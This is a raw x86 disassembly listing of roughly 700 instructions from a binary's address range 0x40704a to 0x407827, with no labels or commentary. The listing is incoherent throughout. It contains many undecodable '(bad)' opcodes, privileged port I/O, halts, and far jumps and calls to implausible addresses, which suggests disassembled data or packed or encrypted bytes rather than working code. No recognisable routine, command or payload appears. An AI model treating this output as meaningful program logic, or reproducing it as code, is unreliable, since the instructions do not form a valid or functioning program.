  40704a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40704b:	jae    0x4070af
  40704d:	mov    WORD PTR [edi],?
  40704f:	outs   dx,DWORD PTR ds:[esi]
  407050:	mov    ah,0xdc
  407052:	xchg   BYTE PTR [esi+eax*4],dl
  407055:	or     dl,BYTE PTR [edx-0x54]
  407058:	xchg   DWORD PTR [edx],edx
  40705a:	in     eax,0x6e
  40705c:	pop    ds
  40705d:	dec    esi
  40705e:	(bad)  
  40705f:	cwde   
  407060:	test   DWORD PTR [eax+0x2f],edx
  407063:	pop    ecx
  407064:	dec    ecx
  407065:	mov    WORD PTR [ebx+0x53241749],?
  40706b:	cs xchg esp,eax
  40706d:	les    esi,FWORD PTR [ebx]
  40706f:	mov    WORD PTR [edi],gs
  407071:	repz sti 
  407073:	int3   
  407074:	out    0xc6,eax
  407076:	push   edx
  407077:	pop    edx
  407078:	je     0x4070a6
  40707a:	fcom   DWORD PTR [esi+esi*4+0x74]
  40707e:	popa   
  40707f:	leave  
  407080:	pop    ecx
  407081:	push   es
  407082:	and    eax,0xfb84e15
  407087:	add    al,0x1b
  407089:	or     DWORD PTR [ecx+0x7f],esi
  40708c:	add    DWORD PTR [ebp+0x64250a5],ebp
  407092:	es (bad) 
  407094:	pusha  
  407095:	mov    ecx,0x664e04f
  40709a:	pop    edi
  40709b:	mov    ebx,0xfd126d09
  4070a0:	addr16 sahf 
  4070a2:	rcl    BYTE PTR [ebx-0x3c],1
  4070a5:	shl    DWORD PTR [edx],cl
  4070a7:	or     DWORD PTR [edi+0x3a],esp
  4070aa:	pop    es
  4070ab:	mov    bh,0xc8
  4070ad:	xchg   BYTE PTR [edx+0x328e621e],bl
  4070b3:	call   0xb1872f66
  4070b8:	test   al,0x2a
  4070ba:	inc    ecx
  4070bb:	mov    al,0x52
  4070bd:	mov    WORD PTR [edx-0x5cc8f050],fs
  4070c3:	into   
  4070c4:	(bad)  
  4070c5:	bound  esp,QWORD PTR [esi+ebp*2+0x66761b16]
  4070cc:	(bad)  
  4070cd:	mov    edx,0x82f35abb
  4070d2:	jns    0x4070e5
  4070d4:	lahf   
  4070d5:	xchg   esi,eax
  4070d6:	fadd   DWORD PTR [eax+0x5e77324a]
  4070dc:	dec    ebx
  4070dd:	imul   eax,DWORD PTR [edx],0xe94eeb43
  4070e3:	into   
  4070e4:	js     0x407067
  4070e6:	sbb    al,0x8f
  4070e8:	div    DWORD PTR [ebp-0x7619da26]
  4070ee:	add    eax,0x4201877f
  4070f3:	mov    WORD PTR [edx+0xa],cs
  4070f6:	in     eax,0xaf
  4070f8:	sti    
  4070f9:	push   ecx
  4070fa:	mov    edx,0x9d6baf11
  4070ff:	jg     0x4070d0
  407101:	cmp    cl,BYTE PTR [ebp+0x3e9cb7b5]
  407107:	hlt    
  407108:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407109:	push   edx
  40710a:	dec    esi
  40710b:	add    esi,edi
  40710d:	push   ecx
  40710e:	das    
  40710f:	sub    BYTE PTR [ebx-0x4c],al
  407112:	cmp    BYTE PTR [esi+edi*4+0x353191fc],0xae
  40711a:	test   al,0x55
  40711c:	int3   
  40711d:	and    ch,ah
  40711f:	(bad)  
  407120:	outs   dx,DWORD PTR ds:[esi]
  407121:	or     BYTE PTR [ecx-0x26],bh
  407124:	fisttp WORD PTR ds:0x77720d7a
  40712a:	dec    edx
  40712b:	inc    eax
  40712c:	jae    0x407120
  40712e:	sar    al,0x89
  407131:	mov    bl,0xc6
  407133:	jnp    0x407160
  407135:	jge    0x40710d
  407137:	nop
  407138:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407139:	inc    edx
  40713a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40713b:	mov    al,0x8c
  40713d:	sbb    eax,0xed4ea87
  407142:	xchg   esp,eax
  407143:	repnz popf 
  407145:	lea    edi,[edi-0x1d]
  407148:	xchg   ebp,eax
  407149:	repz mov edx,edi
  40714c:	gs es test eax,0xce1547e5
  407153:	xor    BYTE PTR [ebx+0x1670bc1b],0x29
  40715a:	mov    edx,0x2cb58bba
  40715f:	ins    DWORD PTR es:[edi],dx
  407160:	repz cmp ecx,DWORD PTR [esi+0x6f]
  407164:	rol    ah,1
  407166:	pusha  
  407167:	pop    edi
  407168:	cwde   
  407169:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40716a:	test   BYTE PTR [ecx-0x7f7aed9b],dh
  407170:	mov    ah,0x84
  407172:	jnp    0x4071c4
  407174:	daa    
  407175:	out    dx,eax
  407176:	pop    ebx
  407177:	leave  
  407178:	fadd   QWORD PTR [edx+0x5f0346dc]
  40717e:	mov    ebp,0x3f2b5d21
  407183:	mov    esp,DWORD PTR [esi]
  407185:	jmp    DWORD PTR [eax+eax*2+0x331fcc73]
  40718c:	cs aam 0xb9
  40718f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407190:	or     BYTE PTR [esi-0x44cfff90],dl
  407196:	mov    DWORD PTR [edi+eiz*1+0x2c5f11aa],eax
  40719d:	sub    BYTE PTR [eax-0x4ffac939],dh
  4071a3:	int    0xfc
  4071a5:	(bad)  
  4071a6:	sbb    al,0xd
  4071a8:	pop    eax
  4071a9:	je     0x4071fb
  4071ab:	push   0xffffff98
  4071ad:	arpl   WORD PTR [ebx-0x166af700],si
  4071b3:	mov    ah,0xe1
  4071b5:	(bad)  
  4071b6:	rol    BYTE PTR [edx+0x4d],cl
  4071b9:	or     al,0x96
  4071bb:	inc    eax
  4071bc:	push   edi
  4071bd:	leave  
  4071be:	cwde   
  4071bf:	xchg   esp,eax
  4071c0:	test   cl,ah
  4071c2:	dec    BYTE PTR [eax]
  4071c4:	mov    ebp,0x5534936a
  4071c9:	dec    ebx
  4071ca:	xchg   ebx,eax
  4071cb:	hlt    
  4071cc:	dec    ecx
  4071cd:	mov    al,ds:0x77f78dda
  4071d2:	mov    eax,0xcf96aeee
  4071d7:	mov    ebp,0x4960defa
  4071dc:	jge    0x40722f
  4071de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071df:	xor    DWORD PTR [edi+0x75],ecx
  4071e2:	fbstp  TBYTE PTR ds:0x771b93fc
  4071e8:	and    al,0xbd
  4071ea:	cmc    
  4071eb:	xor    bh,bl
  4071ed:	cmp    esi,DWORD PTR [ebx-0x569a29b4]
  4071f3:	(bad)  
  4071f4:	mov    bh,0x2b
  4071f6:	out    dx,eax
  4071f7:	lods   eax,DWORD PTR ds:[esi]
  4071f8:	and    edx,DWORD PTR [ebx+ebx*2+0x50d6c648]
  4071ff:	pop    eax
  407200:	scas   al,BYTE PTR es:[edi]
  407201:	mov    al,0xb9
  407203:	and    eax,0x6e104004
  407208:	mov    eax,0x5f412764
  40720d:	pop    ecx
  40720e:	cs imul edi,esp,0xffffffe3
  407212:	jno    0x4071de
  407214:	shl    BYTE PTR [ebx+0x9],0xc7
  407218:	mov    eax,DWORD PTR [esi-0x25]
  40721b:	gs enter 0xc5e6,0xa8
  407220:	push   0xfffffff6
  407222:	dec    edi
  407223:	cwde   
  407224:	aas    
  407225:	xor    al,0xbf
  407227:	test   eax,0xd9f2aa87
  40722c:	cmp    DWORD PTR [edi-0x19768555],ecx
  407232:	mov    esi,DWORD PTR [edi+0x4b33342]
  407238:	mov    ecx,0x5e8b8a3
  40723d:	loopne 0x4072b6
  40723f:	(bad)  
  407240:	ficomp WORD PTR [esi+eax*1+0x6e]
  407244:	pop    esp
  407245:	push   cs
  407246:	xchg   BYTE PTR [edx],ah
  407248:	inc    ebx
  407249:	test   DWORD PTR ds:0x2bf92c51,eax
  40724f:	inc    DWORD PTR [edi+0x1]
  407252:	push   ebx
  407253:	sub    eax,0x7e56d6c3
  407258:	adc    eax,0xccb834eb
  40725d:	not    BYTE PTR [edx-0x16]
  407260:	fst    QWORD PTR [esi]
  407262:	xor    BYTE PTR [ebp-0x36182d9d],0xe2
  407269:	scas   eax,DWORD PTR es:[edi]
  40726a:	dec    ecx
  40726b:	(bad)  
  40726c:	rol    DWORD PTR [ebx],1
  40726e:	aad    0x4d
  407270:	test   BYTE PTR [esi],al
  407272:	push   cs
  407273:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407274:	js     0x407213
  407276:	xor    eax,edi
  407278:	xlat   BYTE PTR ds:[ebx]
  407279:	fmul   QWORD PTR [edx+0x75ce6a46]
  40727f:	inc    ebx
  407280:	mov    al,ds:0x4d671bab
  407285:	sub    dl,dh
  407287:	jmp    0x4072cf
  407289:	arpl   WORD PTR [eax],dx
  40728b:	or     ecx,ebx
  40728d:	xor    al,0xf0
  40728f:	fwait
  407290:	push   ecx
  407291:	inc    eax
  407292:	inc    eax
  407293:	aas    
  407294:	pop    ecx
  407295:	xlat   BYTE PTR ds:[ebx]
  407296:	out    0x9f,eax
  407298:	cld    
  407299:	mov    bl,0xc1
  40729b:	xchg   DWORD PTR [edi-0x32],esp
  40729e:	adc    BYTE PTR [ecx-0x65fe5af],0x95
  4072a5:	adc    esp,DWORD PTR [eax]
  4072a7:	js     0x407251
  4072a9:	or     esp,ebp
  4072ab:	push   es
  4072ac:	test   DWORD PTR [edi],0xea7ccdb3
  4072b2:	(bad)  
  4072b3:	push   ss
  4072b4:	mov    eax,0x604b190
  4072b9:	mov    fs,WORD PTR [eax-0x52395e06]
  4072bf:	xlat   BYTE PTR ds:[ebx]
  4072c0:	bound  esp,QWORD PTR [edi+0x709a9791]
  4072c6:	fistp  QWORD PTR [eax+0x27]
  4072c9:	cmp    ecx,edx
  4072cb:	pop    eax
  4072cc:	mov    ch,0xb7
  4072ce:	fld    st(3)
  4072d0:	mov    eax,DWORD PTR [esi+0x7b]
  4072d3:	popf   
  4072d4:	fwait
  4072d5:	lock pop edx
  4072d7:	scas   eax,DWORD PTR es:[edi]
  4072d8:	push   cs
  4072d9:	pop    es
  4072da:	mov    al,ds:0x5f80602a
  4072df:	xchg   esi,eax
  4072e0:	and    cl,ah
  4072e2:	shl    dh,0xda
  4072e5:	inc    ebx
  4072e6:	fild   QWORD PTR [esi-0x44]
  4072e9:	sti    
  4072ea:	adc    eax,DWORD PTR [ebx+0x730c2787]
  4072f0:	rcr    BYTE PTR [eax],cl
  4072f2:	jp     0x4072dc
  4072f4:	aas    
  4072f5:	mov    WORD PTR ds:0x3ee81c3e,?
  4072fb:	iret   
  4072fc:	dec    ebx
  4072fd:	aad    0x52
  4072ff:	jne    0x40732f
  407301:	sahf   
  407302:	mov    ch,0x5
  407304:	pop    ebp
  407305:	cmp    al,0xb3
  407307:	int3   
  407308:	sub    eax,0x3c949d2c
  40730d:	test   al,0x76
  40730f:	popa   
  407310:	out    0x5c,eax
  407312:	mov    edx,0x59516b99
  407317:	xor    DWORD PTR [eax-0x103c2e18],esi
  40731d:	je     0x40739b
  40731f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407320:	inc    edi
  407321:	sar    DWORD PTR [edi+eax*2+0x1e],cl
  407325:	jecxz  0x4072af
  407327:	and    BYTE PTR [eax+ecx*8-0x1a],al
  40732b:	inc    edi
  40732c:	push   edx
  40732d:	leave  
  40732e:	outs   dx,DWORD PTR ds:[esi]
  40732f:	pop    esp
  407330:	enter  0x7518,0xe
  407334:	cmp    eax,DWORD PTR [esi-0x5f]
  407337:	mov    eax,0xdeb17f29
  40733c:	mov    esp,0x522b3f54
  407341:	mov    al,0xdc
  407343:	mov    eax,0x33b6fa2f
  407348:	mov    bl,BYTE PTR [ecx+0x5f]
  40734b:	(bad)  
  40734c:	and    eax,0x4a658689
  407351:	(bad)  
  407352:	scas   eax,DWORD PTR es:[edi]
  407353:	in     al,0x74
  407355:	jl     0x4072db
  407357:	mov    edx,0x21dd52a3
  40735c:	dec    ebp
  40735d:	cwde   
  40735e:	sbb    al,BYTE PTR [ecx+0x36]
  407361:	ja     0x407377
  407363:	neg    al
  407365:	ja     0x407337
  407367:	div    DWORD PTR [ebx]
  407369:	cmc    
  40736a:	jb     0x407311
  40736c:	jle    0x4073e1
  40736e:	jmp    0x75b337a5
  407373:	iret   
  407374:	loop   0x40733c
  407376:	std    
  407377:	mov    eax,ds:0x3c06a5c2
  40737c:	pop    eax
  40737d:	xchg   edx,eax
  40737e:	bound  esp,QWORD PTR [edx]
  407380:	call   0x60611fa8
  407385:	jl     0x407351
  407387:	mov    ah,0x8b
  407389:	mov    dl,0x92
  40738b:	xchg   ebp,eax
  40738c:	jle    0x407395
  40738e:	add    ebp,ecx
  407390:	inc    ebp
  407391:	addr16 inc eax
  407393:	cli    
  407394:	test   DWORD PTR [edi+0xa],ebp
  407397:	mov    cs,WORD PTR [edx-0x1c]
  40739a:	xchg   ebp,eax
  40739b:	or     DWORD PTR [ebx-0x73ac200d],ebp
  4073a1:	push   ebx
  4073a2:	xor    ebx,esp
  4073a4:	sub    ch,BYTE PTR [esi+0x1c1e6100]
  4073aa:	gs in  al,dx
  4073ac:	std    
  4073ad:	pop    edi
  4073ae:	jno    0x4073af
  4073b0:	xor    al,bl
  4073b2:	in     eax,0xa5
  4073b4:	sbb    BYTE PTR [eax],cl
  4073b6:	add    eax,0xf05aaa60
  4073bb:	repnz sti 
  4073bd:	dec    esi
  4073be:	out    dx,eax
  4073bf:	push   edx
  4073c0:	push   ss
  4073c1:	(bad)  
  4073c2:	sbb    bh,BYTE PTR [ebx-0x1cf0dddd]
  4073c8:	pop    ecx
  4073c9:	push   esp
  4073ca:	mov    ecx,?
  4073cc:	pusha  
  4073cd:	stc    
  4073ce:	mov    ds:0xfa815455,al
  4073d3:	loop   0x4073a6
  4073d5:	lods   eax,DWORD PTR ds:[esi]
  4073d6:	inc    esi
  4073d7:	iret   
  4073d8:	mov    ecx,ebp
  4073da:	cmp    ebp,DWORD PTR [ecx+0x14dee9fa]
  4073e0:	outs   dx,DWORD PTR ds:[esi]
  4073e1:	push   edi
  4073e2:	xchg   ecx,eax
  4073e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073e4:	sub    eax,0x8cb01813
  4073e9:	fistp  DWORD PTR [ebp+edx*2+0x7597473f]
  4073f0:	ins    DWORD PTR es:[edi],dx
  4073f1:	loope  0x40744f
  4073f3:	mov    edi,0x1f5b3689
  4073f8:	add    eax,ecx
  4073fa:	adc    eax,DWORD PTR [ecx]
  4073fc:	mov    WORD PTR [eax+0x136fe216],gs
  407402:	mov    DWORD PTR [ebp+0x2e7dc9b6],0xecddf066
  40740c:	pop    ecx
  40740d:	lahf   
  40740e:	std    
  40740f:	sbb    al,0x69
  407411:	test   DWORD PTR [eax-0x4f8aa51c],ecx
  407417:	push   0xffffffbb
  407419:	loopne 0x40741b
  40741b:	pop    es
  40741c:	adc    esi,eax
  40741e:	out    0xcf,al
  407420:	push   ss
  407421:	repnz dec edi
  407423:	iret   
  407424:	jmp    0x4073f9
  407426:	pop    ebp
  407427:	xchg   ecx,eax
  407428:	sbb    BYTE PTR [edi],bl
  40742a:	cmp    BYTE PTR [edi-0x39],ah
  40742d:	hlt    
  40742e:	jmp    0x34f8bdd5
  407433:	iret   
  407434:	adc    esi,DWORD PTR ds:0xb77aef42
  40743a:	jmp    0x2d5b:0x13fe8819
  407441:	dec    esp
  407442:	jns    0x407491
  407444:	jno    0x4073dd
  407446:	xchg   DWORD PTR [ebx-0x28],edx
  407449:	sub    esi,esp
  40744b:	pushf  
  40744c:	xor    dl,cl
  40744e:	xchg   ebx,eax
  40744f:	or     al,0x15
  407451:	gs (bad) 
  407454:	stc    
  407455:	push   ebx
  407456:	addr16 mov edi,0x77f1e0a1
  40745c:	jns    0x4073f6
  40745e:	adc    eax,0x704cfa68
  407463:	mov    edx,es
  407465:	clc    
  407466:	clc    
  407467:	rcl    DWORD PTR [eax+0x3e],cl
  40746a:	fistp  DWORD PTR [eax+0x1c0dabe4]
  407470:	jns    0x4073fa
  407472:	xchg   al,bh
  407474:	pop    ebx
  407475:	and    eax,0x8ee16ab
  40747a:	fdiv   DWORD PTR [esi-0x5]
  40747d:	aad    0xa3
  40747f:	xchg   edi,eax
  407480:	xchg   ebp,eax
  407481:	add    eax,0x2ff2893d
  407486:	cmp    al,0xff
  407488:	pop    ecx
  407489:	loope  0x407482
  40748b:	lock dec edx
  40748d:	arpl   WORD PTR [eax-0x1a],sp
  407490:	push   cs
  407491:	xor    edx,DWORD PTR [ebx]
  407493:	hlt    
  407494:	lahf   
  407495:	push   edx
  407496:	sub    BYTE PTR [eax+0x75],bl
  407499:	in     al,0xd
  40749b:	call   0x530b:0xe7937ead
  4074a2:	jle    0x4074e0
  4074a4:	add    al,BYTE PTR [edi+0x723b02ce]
  4074aa:	add    dl,BYTE PTR [esi]
  4074ac:	inc    ebx
  4074ad:	xchg   ebp,eax
  4074ae:	xchg   ebp,eax
  4074af:	cmp    DWORD PTR [ebx],esp
  4074b1:	nop
  4074b2:	je     0x407504
  4074b4:	dec    edx
  4074b5:	xchg   esp,eax
  4074b6:	fs das 
  4074b8:	out    dx,eax
  4074b9:	sbb    bh,bl
  4074bb:	dec    ecx
  4074bc:	iret   
  4074bd:	add    ah,dl
  4074bf:	xor    ch,BYTE PTR [edi]
  4074c1:	sub    DWORD PTR [ecx],ebx
  4074c3:	sbb    ecx,ebx
  4074c5:	mov    dl,0x8b
  4074c7:	add    eax,edi
  4074c9:	test   BYTE PTR [edi-0x33c93313],ch
  4074cf:	shr    BYTE PTR [esi],cl
  4074d1:	scas   al,BYTE PTR es:[edi]
  4074d2:	pop    es
  4074d3:	mov    WORD PTR [edi],?
  4074d5:	mov    ch,0x69
  4074d7:	and    DWORD PTR [ecx],esi
  4074d9:	push   0xffffff81
  4074db:	test   esp,edx
  4074dd:	cmp    BYTE PTR [esp+esi*4],bh
  4074e0:	mov    esp,0xca01fa09
  4074e5:	cmp    cl,ch
  4074e7:	dec    edx
  4074e8:	ds test al,0xf2
  4074eb:	mov    WORD PTR [edi+0xcfd9e74],gs
  4074f1:	pop    ecx
  4074f2:	retf   0xdd87
  4074f5:	bndldx (bad),[eax+0x76]
  4074f9:	gs jnp 0x4074dd
  4074fc:	sub    DWORD PTR [edi+eax*8-0x3f],eax
  407500:	retf   0x7408
  407503:	call   0x229:0x100e83b
  40750a:	sar    dl,1
  40750c:	mov    BYTE PTR [edi+0x44a5a59b],dh
  407512:	push   ebx
  407513:	mov    edi,esp
  407515:	fimul  DWORD PTR [ecx-0x6295b267]
  40751b:	fcmovu st,st(0)
  40751d:	xchg   DWORD PTR [eax],ebx
  40751f:	nop
  407520:	shl    BYTE PTR [edx-0x1de38579],1
  407526:	(bad)  
  407527:	jp     0x407554
  407529:	and    edx,esi
  40752b:	jp     0x407573
  40752d:	push   esp
  40752e:	xchg   esp,eax
  40752f:	pop    edi
  407530:	mov    al,0x4
  407532:	inc    ebp
  407533:	mov    esp,0xfb0c1fd2
  407538:	iret   
  407539:	sahf   
  40753a:	iret   
  40753b:	or     al,0xb
  40753d:	xchg   DWORD PTR [esi-0x28a613fa],eax
  407543:	cs mov ebx,0xeffebb26
  407549:	add    BYTE PTR [ecx],ch
  40754b:	add    BYTE PTR [ebx],0xc0
  40754e:	bound  ecx,QWORD PTR [esi+0x58]
  407551:	ret    
  407552:	aaa    
  407553:	pusha  
  407554:	scas   eax,DWORD PTR es:[edi]
  407555:	pop    es
  407556:	(bad)  
  407557:	pop    eax
  407558:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407559:	sub    eax,0xe95b5e12
  40755e:	stc    
  40755f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407560:	popa   
  407561:	mov    cs,WORD PTR [edx+0x1b]
  407564:	hlt    
  407565:	adc    al,0x29
  407567:	mov    esi,0x448e9214
  40756c:	jbe    0x40758a
  40756e:	adc    edi,DWORD PTR [edi-0x56]
  407571:	fs mov dl,0xbf
  407574:	lea    esi,[esi+0x37]
  407577:	mov    ds:0x30853138,al
  40757c:	or     BYTE PTR [ebp-0x7b],al
  40757f:	fsub   st,st(3)
  407581:	jmp    0xf25ec907
  407586:	or     DWORD PTR [ebx],ebx
  407588:	mov    ecx,0xee340572
  40758d:	nop
  40758e:	jns    0x4075ee
  407590:	xchg   edi,eax
  407591:	mov    edx,DWORD PTR [edx-0x26fdcca6]
  407597:	call   0x60ca43ef
  40759c:	add    ebp,ebx
  40759e:	ss add bh,bh
  4075a1:	adc    al,0x68
  4075a3:	popf   
  4075a4:	sti    
  4075a5:	sbb    al,0xa7
  4075a7:	(bad)  
  4075a8:	kaddw  k5,k7,k6
  4075ac:	inc    ecx
  4075ad:	mov    edx,0xf5fd42cd
  4075b2:	call   0x9d3cb878
  4075b7:	push   cs
  4075b8:	sbb    BYTE PTR [ecx+0x6],ah
  4075bb:	enter  0x3eef,0x8b
  4075bf:	mov    ah,0xe9
  4075c1:	sahf   
  4075c2:	adc    bl,cl
  4075c4:	mov    ecx,DWORD PTR [edi-0x3b]
  4075c7:	iret   
  4075c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075c9:	mov    al,BYTE PTR [ecx+0x2]
  4075cc:	(bad)  
  4075cd:	outs   dx,DWORD PTR ds:[esi]
  4075ce:	jb     0x40761d
  4075d0:	call   FWORD PTR [ecx+0x61aebbdc]
  4075d6:	inc    ebx
  4075d7:	pop    esp
  4075d8:	mov    esi,0xf00e6194
  4075dd:	sbb    ebx,edx
  4075df:	mov    bl,0xd0
  4075e1:	inc    edx
  4075e2:	sbb    BYTE PTR [eax-0x2362b794],al
  4075e8:	mov    ?,WORD PTR ds:0xc10e6655
  4075ee:	sub    BYTE PTR [eax],al
  4075f0:	ins    DWORD PTR es:[edi],dx
  4075f1:	sub    BYTE PTR [edi-0x47d55525],0xdf
  4075f8:	cmp    bh,BYTE PTR [edi-0x3591fabe]
  4075fe:	or     BYTE PTR ds:0x91a38411,bh
  407604:	adc    al,0x86
  407606:	fisubr DWORD PTR [ecx+0x2c]
  407609:	add    eax,0xdb1c248e
  40760e:	or     BYTE PTR [esi+0x72],cl
  407611:	pop    esi
  407612:	hlt    
  407613:	shl    DWORD PTR [edx],1
  407615:	icebp  
  407616:	js     0x407663
  407618:	mov    esp,0x633c2b7a
  40761d:	fidiv  WORD PTR [ecx+0xe]
  407620:	add    bh,BYTE PTR [edx-0x666f9e53]
  407626:	xchg   esi,eax
  407627:	in     al,dx
  407628:	xor    cl,ah
  40762a:	aaa    
  40762b:	adc    ah,BYTE PTR [esi]
  40762d:	(bad)  
  40762e:	rcr    BYTE PTR [eax],cl
  407630:	dec    eax
  407631:	cdq    
  407632:	jp     0x407680
  407634:	mov    dl,0x68
  407636:	xor    al,0x1c
  407638:	push   esi
  407639:	inc    esp
  40763a:	push   esp
  40763b:	sbb    ecx,esi
  40763d:	ja     0x40760d
  40763f:	xchg   edi,eax
  407640:	repnz mov ch,0xe5
  407643:	stc    
  407644:	inc    esp
  407645:	out    dx,al
  407646:	add    al,0xf8
  407648:	sub    eax,0x34883111
  40764d:	aaa    
  40764e:	dec    esi
  40764f:	imul   eax,ecx,0x7c3a8faf
  407655:	clc    
  407656:	inc    ebp
  407657:	pop    ecx
  407658:	fs je  0x4075fe
  40765b:	cmp    eax,0x1d1119bb
  407660:	jo     0x4076de
  407662:	push   cs
  407663:	scas   eax,DWORD PTR es:[edi]
  407664:	add    al,0xc
  407666:	mov    ecx,0x9d707bd6
  40766b:	jnp    0x407699
  40766d:	mov    dh,0x1a
  40766f:	mov    ds:0x7158392d,eax
  407674:	xor    ebx,0xb07c16b7
  40767a:	jbe    0x4076c6
  40767c:	bound  ebp,QWORD PTR [ecx-0x15]
  40767f:	mov    ds:0x55a60c0a,al
  407684:	mov    esi,0x7f6f6b45
  407689:	mov    esi,0x49233291
  40768e:	fcom   DWORD PTR [ebx+0x1e408166]
  407694:	cmc    
  407695:	test   BYTE PTR [ebx],dl
  407697:	aas    
  407698:	popa   
  407699:	fild   WORD PTR [ebp-0xe22fc7c]
  40769f:	fcom   DWORD PTR [edx-0x73]
  4076a2:	sub    al,0x76
  4076a4:	gs test eax,0x1ed5fe3
  4076aa:	cli    
  4076ab:	mov    ds:0x3a3951c2,eax
  4076b0:	push   ebx
  4076b1:	rcr    BYTE PTR [ebx+0x3b],cl
  4076b4:	fcom   DWORD PTR [ecx-0x582f3447]
  4076ba:	jno    0x40768f
  4076bc:	pop    edi
  4076bd:	mov    gs,WORD PTR [ebx-0x1]
  4076c0:	lock lods al,BYTE PTR ds:[esi]
  4076c2:	xchg   edi,eax
  4076c3:	pop    es
  4076c4:	mov    bl,0x65
  4076c6:	popa   
  4076c7:	adc    eax,0x52c5d567
  4076cc:	(bad)  
  4076cd:	dec    edi
  4076ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076cf:	cwde   
  4076d0:	jg     0x407664
  4076d2:	xchg   ebx,eax
  4076d3:	test   BYTE PTR [esp+ebp*4-0x62],al
  4076d7:	dec    esp
  4076d8:	mov    ah,0xb0
  4076da:	cld    
  4076db:	mov    ds:0x639087d1,eax
  4076e0:	je     0x4076c9
  4076e2:	pop    edi
  4076e3:	inc    edi
  4076e4:	sbb    BYTE PTR [edx],0x53
  4076e7:	or     al,0x80
  4076e9:	mov    DWORD PTR [ebx-0x46],ecx
  4076ec:	es pop ecx
  4076ee:	mov    edx,0x9f6ca899
  4076f3:	fcmovne st,st(6)
  4076f5:	retf   
  4076f6:	and    ecx,DWORD PTR [ebx+0x42]
  4076f9:	push   edx
  4076fa:	pushf  
  4076fb:	nop
  4076fc:	or     al,0x71
  4076fe:	fld    st(5)
  407700:	mov    al,ds:0x2422143f
  407705:	and    ecx,ecx
  407707:	mov    esi,0xf57ee639
  40770c:	loope  0x407713
  40770e:	cld    
  40770f:	popa   
  407710:	push   0x63f44894
  407715:	xor    eax,0xf377d85e
  40771a:	cld    
  40771b:	mov    esp,0xf731659c
  407720:	clc    
  407721:	cmc    
  407722:	shr    BYTE PTR ss:[edx],0x2
  407726:	addr16 jge 0x407787
  407729:	add    eax,0x3c79656f
  40772e:	ror    DWORD PTR [eax],1
  407730:	or     DWORD PTR [esp+eiz*4-0x2c],0x5c7fc4cb
  407738:	jns    0x407782
  40773a:	not    DWORD PTR [edi]
  40773c:	pop    ebx
  40773d:	mov    BYTE PTR [ecx-0x4f33b465],cl
  407743:	daa    
  407744:	nop
  407745:	out    0x2b,eax
  407747:	sub    al,0x29
  407749:	push   ecx
  40774a:	mov    cs,WORD PTR [eax]
  40774c:	xchg   esi,eax
  40774d:	and    edx,ebx
  40774f:	dec    eax
  407750:	je     0x40778b
  407752:	xor    ch,dh
  407754:	pop    edx
  407755:	and    al,0xfa
  407757:	xchg   ebx,eax
  407758:	lds    esp,FWORD PTR [edi-0x18]
  40775b:	mov    ecx,0xff90682f
  407760:	clc    
  407761:	retf   
  407762:	icebp  
  407763:	pop    ebx
  407764:	out    dx,eax
  407765:	imul   ebp,eax
  407768:	mov    ds:0x9e1d477f,eax
  40776d:	dec    edi
  40776e:	push   ss
  40776f:	sbb    ecx,DWORD PTR [eax+0x6e]
  407772:	cmp    ch,al
  407774:	dec    edx
  407775:	outs   dx,DWORD PTR ds:[esi]
  407776:	cld    
  407777:	dec    ebx
  407778:	imul   esp,edx,0x45
  40777b:	(bad)  
  40777c:	xor    bl,BYTE PTR [edi-0x2e]
  40777f:	fld    st(6)
  407781:	jmp    0x29b1ae52
  407786:	fst    QWORD PTR [edi+0x5e]
  407789:	adc    eax,0x25dfecb7
  40778e:	xchg   esp,eax
  40778f:	mov    DWORD PTR [ecx],esi
  407791:	out    dx,eax
  407792:	cdq    
  407793:	mov    eax,0x7703700a
  407798:	inc    edx
  407799:	icebp  
  40779a:	jmp    0x5d6c:0xd833b05e
  4077a1:	aam    0xc7
  4077a3:	or     DWORD PTR [esp+edi*2+0x315c0041],edi
  4077aa:	add    edx,ebp
  4077ac:	out    0xac,al
  4077ae:	push   DWORD PTR [eax]
  4077b0:	jnp    0x40780f
  4077b2:	lea    ebp,[edx]
  4077b4:	push   edi
  4077b5:	mov    ecx,0xa4cb6748
  4077ba:	mov    esp,0x6003aa4
  4077bf:	loope  0x407819
  4077c1:	adc    ecx,edi
  4077c3:	(bad)  
  4077c5:	stos   DWORD PTR es:[edi],eax
  4077c6:	aaa    
  4077c7:	cld    
  4077c8:	pop    ebx
  4077c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077ca:	loopne 0x407843
  4077cc:	fiadd  DWORD PTR [ecx]
  4077ce:	adc    al,0xb
  4077d0:	and    eax,DWORD PTR [edi]
  4077d2:	retf   0x5af
  4077d5:	jmp    0xbde5d61
  4077da:	xor    cl,dh
  4077dc:	idiv   BYTE PTR [ebp-0x12ee4cd1]
  4077e2:	dec    edi
  4077e3:	push   eax
  4077e4:	pop    eax
  4077e5:	fucom  st(6)
  4077e7:	mov    ecx,0x52c654ba
  4077ec:	push   0x99020f51
  4077f1:	ins    BYTE PTR es:[edi],dx
  4077f2:	jne    0x4077b2
  4077f4:	push   eax
  4077f5:	mov    es,ecx
  4077f7:	out    dx,eax
  4077f8:	inc    bh
  4077fa:	pop    esi
  4077fb:	repz in al,dx
  4077fd:	mov    dl,0xd2
  4077ff:	or     BYTE PTR ds:0x55b89d52,ah
  407805:	jmp    0x40781a
  407807:	sbb    DWORD PTR [eax+0x2fb1db69],0xffffff86
  40780e:	jge    0x407886
  407810:	repz rol BYTE PTR [ecx],0x71
  407814:	jae    0x407862
  407816:	in     eax,0xb3
  407818:	(bad)  
  407819:	fbld   TBYTE PTR [edx-0x68263054]
  40781f:	fcomp  QWORD PTR [edx-0x18]
  407822:	imul   BYTE PTR [ebx-0x5b]
  407825:	xor    dh,dl
  407827:	push   edi
